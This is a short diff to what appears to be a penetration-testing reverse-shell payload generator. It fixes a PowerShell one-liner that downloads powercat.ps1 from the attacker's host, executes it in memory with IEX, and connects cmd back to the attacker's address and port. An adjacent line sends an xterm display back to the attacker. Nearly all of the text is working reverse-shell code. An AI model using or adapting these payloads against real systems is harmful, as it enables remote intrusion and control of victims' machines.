@@ -34,7 +34,7 @@ def generatePayload(type, local_address, port):
     elif type == "xterm":
         return "xterm -display %s:1" % (local_address)
     elif type == "powercat" or type == "powershell":
-        return "powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://%s/powercat.ps1');powercat -c %s -p %d -e cmd\")" % (local_address, local_address, port)
+        return "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://%s/powercat.ps1');powercat -c %s -p %d -e cmd\"" % (local_address, local_address, port)
 
 if __name__ == "__main__":
 
